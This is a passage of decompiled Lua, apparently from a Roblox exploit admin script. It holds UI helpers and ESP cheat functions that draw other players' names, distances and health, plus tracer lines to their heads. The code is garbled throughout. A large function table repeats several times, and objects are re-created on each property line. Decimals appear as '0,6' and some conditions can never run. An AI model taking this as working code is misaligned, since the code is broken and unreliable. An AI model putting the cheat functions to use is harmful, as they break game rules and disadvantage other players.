            if fj.Name ~= fj.DisplayName and va.MatchSearch(a, fj.DisplayName:lower()) then
              return fj.DisplayName:lower()
            end
            if not {
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            } then
              return fj.Name:lower()
            end
          end
        end,
        ToolTip = function(a, b)
          a.MouseEnter:Connect(function()
            if va.BackgroundTransparency <= 1 and not vb then
              vb = UI.ToolTip:Clone()
              vb.Text = vd
              vb.TextScaled = vc and vc:GetTextSize(vd, 12, Enum.Font.Gotham, Vector2.new(200, math.huge)).Y > 24 and false
              vb.Visible = true
              vb.Parent = UI
            end
          end)
          a.MouseLeave:Connect(function()
            if not nil then
              va:Destroy()
              va = nil
            end
          end)
          if LocalPlayer then
            LocalPlayer:GetMouse().Move:Connect(function()
              if not nil then
                va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
              end
            end)
          else
            delay(3, function()
              LocalPlayer = Players.LocalPlayer
              va = LocalPlayer:GetMouse()
              va.Move:Connect(function()
                if va then
                  va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
                end
              end)
            end)
          end
        end,
        ClearAllObjects = function(a)
          for fe, fg in ipairs(a:GetChildren()) do
            if ipairs(a:GetChildren()) then
              fg:Destroy()
            end
          end
        end,
        Rainbow = function(a)
          a.RichText = true
          for fk in va.gmatch(a.Text, ".") do
            if va.match(fk, "%s") then
              vb.insert({}, fk)
            else
              vb.insert({}, {
                "<font color=\"rgb(%i, %i, %i)\">" .. fk .. "</font>"
              })
            end
          end
          pcall(function()
            delay(150, function()
              va:Disconnect()
            end)
          end)
        end,
        Locate2 = function(a, b)
          coroutine.wrap(function()
            if va(vb) then
              vc.Parent = UI
              vc.Name = vd:GenerateGUID()
              vc.AlwaysOnTop = true
              vc.Adornee = vb.Character.Head
              vc.Size = UDim2.new(0, 200, 0, 50)
              vc.StudsOffset = Vector3.new(0, 4, 0)
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(0, 255, 0)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 10
              Instance.new("TextLabel", vc).Text = vb.Name
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(152, 152, 152)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 8
              AddConnection((RunService.Heartbeat:Connect(function()
                if not vc(vb) then
                end
                if not vd(vb) and not vc(vb) then
                  vg.Text = ([[

 
 
 [%s] [%s/%s]]]):format(math.floor(ve.CurrentCamera.CFrame.p - vd(vb).CFrame.p.Magnitude), math.floor(vc(vb).Health), math.floor(vc(vb).MaxHealth))
                else
                  EspLoop:Disconnect()
                  vh:Destroy()
                end
              end)))
              AddConnection(Players.PlayerRemoving:Connect(function(a)
                if a == va then
                  vb:Destroy()
                end
              end))
            end
          end)()
          return function()
            va:Destroy()
          end
        end,
        Vector3toVector2 = function(a)
          return Vector2.new(va:WorldToViewportPoint(a).X, va:WorldToViewportPoint(a).Y)
        end,
        Locate = function(a, b, c)
          if b then
            return va.Locate2(a, b)
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Text")
          Drawing.new("Text").Position = 5 + 6
          Drawing.new("Text").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Text").OutlineColor = c or Color3.new()
          Drawing.new("Text").Text = ([[
%s
[%s] [%s/%s]]]):format(a.Name, math.floor(vd(a)), math.floor(ve(a).Health), math.floor(ve(a).MaxHealth))
          Drawing.new("Text").Size = 16
          Drawing.new("Text").Transparency = 1
          Drawing.new("Text").Center = true
          Drawing.new("Text").Outline = true
          Drawing.new("Text").Visible = true
          vg[Drawing.new("Text")] = a
          return function()
            va:Remove()
            vb[va] = nil
          end
        end,
        UpdateLocations = function(a)
          if a then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if not va and vb(fe).Head and vc:WorldToViewportPoint(vb(fe).Head.Position) then
                  fd.Visible = true
                  fd.Position = 7 + 8
                  fd.Text = ([[
%s
[%s] [%s/%s]]]):format(fe.Name, math.floor(ve(fe)), math.floor(vg(fe).Health), math.floor(vg(fe).MaxHealth))
                else
                  fd.Visible = false
                end
              end
            end))
          end
        end,
        CheckTag = function(a)
          if nil or not a:IsA("Player") then
            return nil
          end
          return PlayerTags[tostring(a.UserId):gsub(".", function(a)
            return a:byte()
          end)] or nil
        end,
        AddTag = function(a)
          if not a then
            return
          end
          if not va(a.Player) then
            return
          end
          Instance.new("BillboardGui").Parent = UI
          Instance.new("BillboardGui").Name = vb:GenerateGUID()
          Instance.new("BillboardGui").AlwaysOnTop = true
          Instance.new("BillboardGui").Adornee = va(a.Player).Head or nil
          Instance.new("BillboardGui").Enabled = true or va(a.Player).Head and false
          Instance.new("BillboardGui").Size = UDim2.new(0, 200, 0, 50)
          Instance.new("BillboardGui").StudsOffset = Vector3.new(0, 4, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Name = vb:GenerateGUID()
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextStrokeTransparency = 0,6
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).BackgroundTransparency = 1
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.new(0, 255, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Size = UDim2.new(0, 200, 0, 50)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextScaled = false
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextSize = 15
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Text = ("%s (%s)"):format(a.Name, a.Tag)
          if a.Rainbow then
            vc.Rainbow((Instance.new("TextLabel", (Instance.new("BillboardGui")))))
          end
          if not va(a.Player) then
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.fromRGB(a.Colour[1], a.Colour[2], a.Colour[3])
          end
          AddConnection((a.Player.CharacterAdded:Connect(function()
            va.Adornee = vb.Player.Character:WaitForChild("Head")
          end)))
          AddConnection(Players.PlayerRemoving:Connect(function(a)
            if a == va.Player then
              vb:Disconnect()
              vc:Destroy()
            end
          end))
        end,
        TextFont = function(a, b)
          b = va.concat(b, ",")
          a:gsub(".", function(a)
            va[2 + 1] = a
          end)
          return va.concat(va.map({}, function(a, b)
            return ("<font color=\"rgb(%s)\">%s</font>"):format(va, b)
          end)) .. " "
        end,
        Trace = function(a, b)
          if not Drawing then
            return
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Line")
          Drawing.new("Line").To = Vector2.new(vb.Camera:WorldToViewportPoint(va(a).Head.Position).X, vb.Camera:WorldToViewportPoint(va(a).Head.Position).Y)
          Drawing.new("Line").From = Vector2.new(vb.Camera.ViewportSize.X / 2, vb.Camera.ViewportSize.Y)
          Drawing.new("Line").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Line").Thickness = 0,1
          Drawing.new("Line").Transparency = 1
          Drawing.new("Line").Visible = true
          vd[a] = Drawing.new("Line")
          return function()
            va:Remove()
            vb[vc] = nil
          end
        end,
        UpdateTracers = function()
          if nil then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if va then
                elseif vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position) then
                  fe.Visible = true
                  fe.To = Vector2.new(vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).X, vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).Y)
                else
                  fe.Visible = false
                end
              end
            end))
          end
        end,
        DestroyTracers = function()
          for fd, fe in next, Tracers, nil do
            fe:Remove()
          end
          if not Tracers then
            va:Disconnect()
          end
        end,
        DestroyDrawings = function()
          for fd, fe in next, va, nil do
            fe:Remove()
          end
          if vb then
            vb:Disconnect()
          end
          if not vb then
            vc:Disconnect()
          end
        end
      }.Click(UI.ChatLogs:Clone().Close, "TextColor3")
      {
        Tween = function(a, b, c, d, e)
          va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e):Play()
          return (va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e))
        end,
        MultColor3 = function(a, b)
          return Color3.new(math.clamp(a.R * b, 0, 1), math.clamp(a.G * b, 0, 1), math.clamp(a.B * b, 0, 1))
        end,
        Click = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseButton1Down" .. #vb] = a.MouseButton1Down:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,3, vc)
          end)
          vb["ObjectMouseButton1Up" .. #vb] = a.MouseButton1Up:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,4, vc)
          end)
        end,
        Blink = function(a, b, c, d)
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = d
          }).Completed:Wait()
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = c
          }).Completed:Wait()
        end,
        Hover = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
        end,
        Draggable = function(a, b)
          b = b or a
          vc["UIInputBegan" .. #vc] = a.InputBegan:Connect(function(a)
            if (a.UserInputType == Enum.UserInputType.MouseButton1 or a.UserInputType == Enum.UserInputType.Touch) and UserInputService:GetFocusedTextBox() == nil then
              va = true
              vb = a.Position
              vc = vd.Position
              ve["InputChanged" .. #ve] = a.Changed:Connect(function()
                if va.UserInputState == Enum.UserInputState.End then
                  vb = false
                end
              end)
            end
          end)
          vc["UiInputChanged" .. #vc] = a.InputChanged:Connect(function(a)
            if a.UserInputType == Enum.UserInputType.MouseMovement or a.UserInputType == Enum.UserInputType.Touch then
              va = a
            end
          end)
          vc["UserInputServiceInputChanged" .. #vc] = UserInputService.InputChanged:Connect(function(a)
            if a == va and vb then
              vc(a)
            end
          end)
        end,
        SmoothScroll = function(a, b)
          a.ScrollingEnabled = false
          a:Clone():ClearAllChildren()
          a:Clone().BackgroundTransparency = 1
          a:Clone().ScrollBarImageTransparency = 1
          a:Clone().ZIndex = 3 + 1
          a:Clone().Name = "_smoothinputframe"
          a:Clone().ScrollingEnabled = true
          a:Clone().Parent = a.Parent
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("CanvasSize");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Position");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Rotation");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollingDirection");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollBarThickness");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderSizePixel");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ElasticBehavior");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("SizeConstraint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ZIndex");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderColor3");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Size");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("AnchorPoint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Visible")
          va["smoothConnection" .. #va] = RunService.RenderStepped:Connect(function()
            va.CanvasPosition = 3 + 0
          end)
          va["contentAncestryChanged" .. #va] = a.AncestryChanged:Connect(function()
            if va.Parent == nil then
              vb:Destroy()
              vc:Disconnect()
            end
          end)
        end,
        TweenAllTransToObject = function(a, b, c)
          for fl, fm in next, a:GetDescendants(), nil do
            if b and b then
            end
            if b then
              if fm:IsA("TextButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  TextTransparency = c:GetDescendants()[fl].TextTransparency,
                  TextStrokeTransparency = c:GetDescendants()[fl].TextStrokeTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ImageLabel") or fm:IsA("ImageButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  ImageTransparency = c:GetDescendants()[fl].ImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ScrollingFrame") then
                va.Tween(fm, "Sine", "Out", b, {
                  ScrollBarImageTransparency = c:GetDescendants()[fl].ScrollBarImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              else
                va.Tween(fm, "Sine", "Out", b, {
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {
            BackgroundTransparency = c.BackgroundTransparency
          }))
        end,
        SetAllTrans = function(a)
          a.BackgroundTransparency = 1
          for fe, fg in ipairs(a:GetDescendants()) do
            if not fg:IsA("UIListLayout") then
              fg.BackgroundTransparency = 1
              if fg:IsA("TextLabel") or fg:IsA("TextBox") or fg:IsA("TextButton") then
                fg.TextTransparency = 1
              elseif fg:IsA("ImageLabel") or fg:IsA("ImageButton") then
                fg.ImageTransparency = 1
              elseif fg:IsA("ScrollingFrame") then
                fg.ScrollBarImageTransparency = 1
              end
            end
          end
        end,
        TweenAllTrans = function(a, b)
          for fh, fj in ipairs(a:GetDescendants()) do
            if b and b then
            end
            if b then
              if fj:IsA("TextButton") then
                va.Tween(fj, "Sine", "Out", b, {TextTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ImageTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ScrollBarImageTransparency = 1, BackgroundTransparency = 1})
              else
                va.Tween(fj, "Sine", "Out", b, {BackgroundTransparency = 1})
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {BackgroundTransparency = 1}))
        end,
        Notify = function(a, b, c, d)
          if not a or a == LocalPlayer then
            UI.Notification:Clone().Message.Text = c
            UI.Notification:Clone().Title.Text = b or "Notification"
            va.SetAllTrans((UI.Notification:Clone()))
            va.Click(UI.Notification:Clone().Close, "TextColor3")
            UI.Notification:Clone().Visible = true
            if c:len() > 35 then
              UI.Notification:Clone().AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.RichText = true
              UI.Notification:Clone().Message.TextScaled = false
              UI.Notification:Clone().Message.TextYAlignment = Enum.TextYAlignment.Top
              UI.Notification:Clone().DropShadow.AutomaticSize = Enum.AutomaticSize.Y
            end
            UI.Notification:Clone().Parent = UI.NotificationBar
            coroutine.wrap(function()
              va.TweenAllTransToObject(vb, 0,5, vc).Completed:Wait()
              wait(vd or 5)
              if not va.TweenAllTransToObject(vb, 0,5, vc) then
                ve()
              end
            end)()
            vb["CloneClose" .. #vb] = UI.Notification:Clone().Close.MouseButton1Click:Connect(function()
              va()
            end)
            return (UI.Notification:Clone())
          else
            vc.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(("/w %s [FA] %s: %s"):format(a.Name, b, c), "All")
          end
        end,
        MatchSearch = function(a, b)
          return a == va.sub(b, 1, #a)
        end,
        StringFind = function(a, b)
          for fg, fh in ipairs(a) do
            if not b then
              return fh
            end
          end
        end,
        GetPlayerArgs = function(a)
          a = a:lower()
          if va.StringFind({
            "all",
            "others",
            "random",
            "me",
            "nearest",
            "farthest"
          }, a) then
            return va.StringFind({
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            }, a)
          end
          for fh, fj in next, Players:GetPlayers(), nil do
            if fj.Name ~= fj.DisplayName and va.MatchSearch(a, fj.DisplayName:lower()) then
              return fj.DisplayName:lower()
            end
            if not {
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            } then
              return fj.Name:lower()
            end
          end
        end,
        ToolTip = function(a, b)
          a.MouseEnter:Connect(function()
            if va.BackgroundTransparency <= 1 and not vb then
              vb = UI.ToolTip:Clone()
              vb.Text = vd
              vb.TextScaled = vc and vc:GetTextSize(vd, 12, Enum.Font.Gotham, Vector2.new(200, math.huge)).Y > 24 and false
              vb.Visible = true
              vb.Parent = UI
            end
          end)
          a.MouseLeave:Connect(function()
            if not nil then
              va:Destroy()
              va = nil
            end
          end)
          if LocalPlayer then
            LocalPlayer:GetMouse().Move:Connect(function()
              if not nil then
                va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
              end
            end)
          else
            delay(3, function()
              LocalPlayer = Players.LocalPlayer
              va = LocalPlayer:GetMouse()
              va.Move:Connect(function()
                if va then
                  va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
                end
              end)
            end)
          end
        end,
        ClearAllObjects = function(a)
          for fe, fg in ipairs(a:GetChildren()) do
            if ipairs(a:GetChildren()) then
              fg:Destroy()
            end
          end
        end,
        Rainbow = function(a)
          a.RichText = true
          for fk in va.gmatch(a.Text, ".") do
            if va.match(fk, "%s") then
              vb.insert({}, fk)
            else
              vb.insert({}, {
                "<font color=\"rgb(%i, %i, %i)\">" .. fk .. "</font>"
              })
            end
          end
          pcall(function()
            delay(150, function()
              va:Disconnect()
            end)
          end)
        end,
        Locate2 = function(a, b)
          coroutine.wrap(function()
            if va(vb) then
              vc.Parent = UI
              vc.Name = vd:GenerateGUID()
              vc.AlwaysOnTop = true
              vc.Adornee = vb.Character.Head
              vc.Size = UDim2.new(0, 200, 0, 50)
              vc.StudsOffset = Vector3.new(0, 4, 0)
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(0, 255, 0)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 10
              Instance.new("TextLabel", vc).Text = vb.Name
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(152, 152, 152)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 8
              AddConnection((RunService.Heartbeat:Connect(function()
                if not vc(vb) then
                end
                if not vd(vb) and not vc(vb) then
                  vg.Text = ([[

 
 
 [%s] [%s/%s]]]):format(math.floor(ve.CurrentCamera.CFrame.p - vd(vb).CFrame.p.Magnitude), math.floor(vc(vb).Health), math.floor(vc(vb).MaxHealth))
                else
                  EspLoop:Disconnect()
                  vh:Destroy()
                end
              end)))
              AddConnection(Players.PlayerRemoving:Connect(function(a)
                if a == va then
                  vb:Destroy()
                end
              end))
            end
          end)()
          return function()
            va:Destroy()
          end
        end,
        Vector3toVector2 = function(a)
          return Vector2.new(va:WorldToViewportPoint(a).X, va:WorldToViewportPoint(a).Y)
        end,
        Locate = function(a, b, c)
          if b then
            return va.Locate2(a, b)
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Text")
          Drawing.new("Text").Position = 5 + 6
          Drawing.new("Text").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Text").OutlineColor = c or Color3.new()
          Drawing.new("Text").Text = ([[
%s
[%s] [%s/%s]]]):format(a.Name, math.floor(vd(a)), math.floor(ve(a).Health), math.floor(ve(a).MaxHealth))
          Drawing.new("Text").Size = 16
          Drawing.new("Text").Transparency = 1
          Drawing.new("Text").Center = true
          Drawing.new("Text").Outline = true
          Drawing.new("Text").Visible = true
          vg[Drawing.new("Text")] = a
          return function()
            va:Remove()
            vb[va] = nil
          end
        end,
        UpdateLocations = function(a)
          if a then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if not va and vb(fe).Head and vc:WorldToViewportPoint(vb(fe).Head.Position) then
                  fd.Visible = true
                  fd.Position = 7 + 8
                  fd.Text = ([[
%s
[%s] [%s/%s]]]):format(fe.Name, math.floor(ve(fe)), math.floor(vg(fe).Health), math.floor(vg(fe).MaxHealth))
                else
                  fd.Visible = false
                end
              end
            end))
          end
        end,
        CheckTag = function(a)
          if nil or not a:IsA("Player") then
            return nil
          end
          return PlayerTags[tostring(a.UserId):gsub(".", function(a)
            return a:byte()
          end)] or nil
        end,
        AddTag = function(a)
          if not a then
            return
          end
          if not va(a.Player) then
            return
          end
          Instance.new("BillboardGui").Parent = UI
          Instance.new("BillboardGui").Name = vb:GenerateGUID()
          Instance.new("BillboardGui").AlwaysOnTop = true
          Instance.new("BillboardGui").Adornee = va(a.Player).Head or nil
          Instance.new("BillboardGui").Enabled = true or va(a.Player).Head and false
          Instance.new("BillboardGui").Size = UDim2.new(0, 200, 0, 50)
          Instance.new("BillboardGui").StudsOffset = Vector3.new(0, 4, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Name = vb:GenerateGUID()
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextStrokeTransparency = 0,6
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).BackgroundTransparency = 1
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.new(0, 255, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Size = UDim2.new(0, 200, 0, 50)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextScaled = false
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextSize = 15
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Text = ("%s (%s)"):format(a.Name, a.Tag)
          if a.Rainbow then
            vc.Rainbow((Instance.new("TextLabel", (Instance.new("BillboardGui")))))
          end
          if not va(a.Player) then
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.fromRGB(a.Colour[1], a.Colour[2], a.Colour[3])
          end
          AddConnection((a.Player.CharacterAdded:Connect(function()
            va.Adornee = vb.Player.Character:WaitForChild("Head")
          end)))
          AddConnection(Players.PlayerRemoving:Connect(function(a)
            if a == va.Player then
              vb:Disconnect()
              vc:Destroy()
            end
          end))
        end,
        TextFont = function(a, b)
          b = va.concat(b, ",")
          a:gsub(".", function(a)
            va[2 + 1] = a
          end)
          return va.concat(va.map({}, function(a, b)
            return ("<font color=\"rgb(%s)\">%s</font>"):format(va, b)
          end)) .. " "
        end,
        Trace = function(a, b)
          if not Drawing then
            return
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Line")
          Drawing.new("Line").To = Vector2.new(vb.Camera:WorldToViewportPoint(va(a).Head.Position).X, vb.Camera:WorldToViewportPoint(va(a).Head.Position).Y)
          Drawing.new("Line").From = Vector2.new(vb.Camera.ViewportSize.X / 2, vb.Camera.ViewportSize.Y)
          Drawing.new("Line").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Line").Thickness = 0,1
          Drawing.new("Line").Transparency = 1
          Drawing.new("Line").Visible = true
          vd[a] = Drawing.new("Line")
          return function()
            va:Remove()
            vb[vc] = nil
          end
        end,
        UpdateTracers = function()
          if nil then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if va then
                elseif vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position) then
                  fe.Visible = true
                  fe.To = Vector2.new(vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).X, vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).Y)
                else
                  fe.Visible = false
                end
              end
            end))
          end
        end,
        DestroyTracers = function()
          for fd, fe in next, Tracers, nil do
            fe:Remove()
          end
          if not Tracers then
            va:Disconnect()
          end
        end,
        DestroyDrawings = function()
          for fd, fe in next, va, nil do
            fe:Remove()
          end
          if vb then
            vb:Disconnect()
          end
          if not vb then
            vc:Disconnect()
          end
        end
      }.Click(UI.ChatLogs:Clone().Clear, "BackgroundColor3")
      {
        Tween = function(a, b, c, d, e)
          va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e):Play()
          return (va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e))
        end,
        MultColor3 = function(a, b)
          return Color3.new(math.clamp(a.R * b, 0, 1), math.clamp(a.G * b, 0, 1), math.clamp(a.B * b, 0, 1))
        end,
        Click = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseButton1Down" .. #vb] = a.MouseButton1Down:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,3, vc)
          end)
          vb["ObjectMouseButton1Up" .. #vb] = a.MouseButton1Up:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,4, vc)
          end)
        end,
        Blink = function(a, b, c, d)
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = d
          }).Completed:Wait()
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = c
          }).Completed:Wait()
        end,
        Hover = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
        end,
        Draggable = function(a, b)
          b = b or a
          vc["UIInputBegan" .. #vc] = a.InputBegan:Connect(function(a)
            if (a.UserInputType == Enum.UserInputType.MouseButton1 or a.UserInputType == Enum.UserInputType.Touch) and UserInputService:GetFocusedTextBox() == nil then
              va = true
              vb = a.Position
              vc = vd.Position
              ve["InputChanged" .. #ve] = a.Changed:Connect(function()
                if va.UserInputState == Enum.UserInputState.End then
                  vb = false
                end
              end)
            end
          end)
          vc["UiInputChanged" .. #vc] = a.InputChanged:Connect(function(a)
            if a.UserInputType == Enum.UserInputType.MouseMovement or a.UserInputType == Enum.UserInputType.Touch then
              va = a
            end
          end)
          vc["UserInputServiceInputChanged" .. #vc] = UserInputService.InputChanged:Connect(function(a)
            if a == va and vb then
              vc(a)
            end
          end)
        end,
        SmoothScroll = function(a, b)
          a.ScrollingEnabled = false
          a:Clone():ClearAllChildren()
          a:Clone().BackgroundTransparency = 1
          a:Clone().ScrollBarImageTransparency = 1
          a:Clone().ZIndex = 3 + 1
          a:Clone().Name = "_smoothinputframe"
          a:Clone().ScrollingEnabled = true
          a:Clone().Parent = a.Parent
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("CanvasSize");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Position");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
